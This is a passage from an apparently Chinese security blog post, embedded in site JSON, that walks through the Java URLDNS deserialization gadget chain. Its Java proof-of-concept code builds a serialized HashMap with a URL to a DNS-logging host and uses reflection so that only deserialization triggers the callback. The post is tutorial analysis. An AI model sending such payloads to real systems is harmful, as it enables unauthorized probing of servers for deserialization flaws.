&#125;&#125; 在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。 12345678910111213141516Gadget Chain： HashMap.readObject()&#123; hash(key) &#125; HashMap.hash(Object,key)&#123; key.hashCode() &#125; URL.hashCode()&#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode(URL u) &#123; getHostAddress(u); &#125; ysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。 那么我们便可以构造代码验证一下 序列化HashMap对象 1234567891011121314151617import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123; URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 hashmap.put(url,1); ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 反序列化HashMap对象 1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnSerialize &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;))); ois.readObject(); &#125;&#125; 这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。 经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到Java反射。 改进后的 1234567891011121314151617181920212223242526import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 Class c = url.getClass(); Field hashCode = c.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,-2);//在put前将hashCode的值设置为-2 hashmap.put(url,1); hashCode.set(url,-1);//之后再设置回-1 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 再次尝试，序列化时没有发送请求。 反序列化发送了请求 至此URLDNS分析完毕。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]}],"categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]}